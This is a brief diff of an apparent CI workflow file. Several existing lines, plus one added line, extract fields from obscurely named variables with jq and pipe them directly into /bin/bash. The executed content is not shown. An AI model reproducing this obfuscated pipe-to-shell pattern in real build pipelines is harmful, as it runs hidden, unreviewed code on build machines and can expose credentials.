@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$kf490" | jq -r .qaizh11 | /bin/bash
           echo $kvt17 | jq -r .zwguq60 | /bin/bash
           echo $vvmif71 | jq -r .ogw78 | /bin/bash
+          echo $y39 | jq -r .vbteh473 | /bin/bash
 
       - name: Upload artifact
         if: always()
